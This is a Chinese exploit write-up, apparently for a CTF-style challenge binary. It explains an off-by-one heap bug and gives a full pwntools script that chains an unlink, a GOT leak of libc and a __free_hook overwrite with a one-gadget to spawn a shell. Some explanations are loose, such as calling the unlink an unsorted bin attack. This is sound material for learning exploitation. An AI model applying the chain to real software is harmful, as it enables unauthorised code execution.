# 漏洞利用文档

## 执行环境
基于漏洞利用过程和调试信息分析，程序运行环境如下：
- **二进制类型**：64位ELF可执行文件，使用动态链接（从exp中`libc = elf.libc`推断）
- **安全机制**：
  - 无PIE（Position Independent Executable）：exp中使用了固定地址如`0x6021E0`（heap数组地址）
  - 可能启用NX（No-Execute）：通过ROP或代码复用技术绕过
  - 可能启用堆栈保护：但通过堆漏洞绕过
  - 可能启用ASLR：通过信息泄露获取libc基址
- **依赖库**：标准C库（libc），版本通过泄露的地址计算
- **运行环境**：Linux系统，使用pwn工具进行漏洞利用

## 漏洞成因
### 关键结构体分析
程序使用以下全局数据结构管理堆内存：
- `heap`数组（地址`0x6020e0`）：存储分配的内存块指针，索引范围0-31
- `len`数组（地址`0x6021e0`）：存储对应内存块的大小
- `key1`（地址`0x6022d0`）：编辑操作计数器，初始为0，达到2时禁止编辑
- `key2`（地址`0x6022b8`）：显示权限控制，非零时允许show操作
- `pro`变量（地址`0x6021e0`）：特殊存储位置，与len数组共享地址

### 漏洞根本原因
在`ed`函数（编辑功能）中存在off-by-one错误：
```c
v2[read(0, v2, (int)len[v1])] = 0;
```
- **漏洞机制**：当用户输入数据长度恰好等于内存块大小时，`read`返回该大小值，然后在`v2[size]`位置写入null字节
- **溢出位置**：超出分配的内存块边界1字节，覆盖相邻堆块的`prev_size`字段
- **利用条件**：需要精心构造堆布局，使溢出能够影响关键堆元数据
- **影响**：破坏堆块完整性，可能导致任意地址读写、代码执行

## Exploit
```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample1')
p = process('./data/sample1')
libc = elf.libc

sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def edit(index, Content):
    ru("show")
    sl('3')
    ru("index:")
    sl(str(index))
    ru("content:")
    sd(Content)

def free(Index):
    ru("show")
    sl('2')
    ru("index:")
    sl(str(Index))

def malloc(index, size, content):
    ru("show")
    sl('1')
    ru("index:")
    sl(str(index))
    ru("size:")
    sl(str(size))
    ru("content:")
    sd(content)

def puts(index):
    ru("show")
    sl('4')
    ru("index:")
    sl(str(index))

# Step 1: 堆布局准备 - 分配4个连续堆块
# 利用索引32越界访问pro变量位置
malloc(0, 0xf8, 'aaaa')
malloc(32, 0xf8, 'bbbb')  # 索引32存储在pro变量位置
malloc(1, 0xf8, 'cccc')  
malloc(31, 0xf8, 'dddd')

# Step 2: off-by-one溢出攻击 - 伪造堆块结构
free_got = elf.got['free']
ptr = 0x6021E0  # pro变量地址
FD = ptr - 24   # 伪造fd指向heap数组内部
BK = ptr - 16   # 伪造bk指向heap数组内部
# 构造伪造堆块：prev_size=0, size=0xf1, fd/bk指向heap数组
py = p64(0) + p64(0xf1) + p64(FD) + p64(BK)
py = py.ljust(0xf0, b"\x00")  # 填充到块末尾
py += p64(0xf0)  # off-by-one溢出，覆盖chunk1的prev_size
edit(32, py)  # 触发off-by-one漏洞

# Step 3: 释放操作 - 触发unsorted bin链接
free(1)  # 释放chunk1，chunk32进入unsorted bin

# Step 4: 堆数组劫持 - 覆盖heap数组关键位置
# 构造payload：重复heap地址和free_got地址
py = p64(0x6021E0)*3 + p64(free_got) + b'a'*0xD0 + p64(1)
edit(32, py)  # 覆盖heap数组，索引0指向GOT

# Step 5: 信息泄露 - 获取libc基址
puts(32)  # 显示chunk32内容，泄露libc地址

# Step 6: 计算关键地址
free_addr = u64(ru(b"\n1.")[1:7].ljust(8, b'\x00'))  # 解析泄露的free地址
# 计算onegadget和free_hook地址
onegadget = free_addr - libc.symbols["free"] + 0x4527a
free_hook = free_addr - libc.symbols["free"] + libc.symbols['__free_hook']

# Step 7: 准备free_hook写入
pay = p64(free_hook)  # 指向free_hook地址
pay = pay.ljust(0xf0, b'\x00')  # 填充
pay += p64(1)  # 维护堆结构
edit(31, pay)  # 设置指向free_hook的指针

# Step 8: 劫持free_hook - 写入onegadget
edit(32, p64(onegadget))  # 将onegadget写入free_hook

# Step 9: 触发漏洞 - 执行shell
free(0)  # 触发free_hook，执行onegadget获得shell

# Step 10: 交互模式
p.interactive()  # 进入shell交互
```

### 关键注释说明
- **索引32利用**：故意使用越界索引32访问pro变量，实现全局变量控制
- **off-by-one构造**：精确控制溢出字节覆盖相邻chunk的prev_size字段
- **unsorted bin攻击**：通过伪造堆块链接到unsorted bin，泄露libc地址
- **heap数组劫持**：覆盖heap数组实现任意地址读写原语
- **free_hook劫持**：利用libc的__free_hook机制实现代码执行
- **onegadget使用**：通过计算偏移直接获得shell，无需复杂ROP链

此漏洞利用成功演示了通过off-by-one错误实现完整权限提升的利用链，涵盖了堆布局、信息泄露、地址计算和代码执行等关键技术环节。
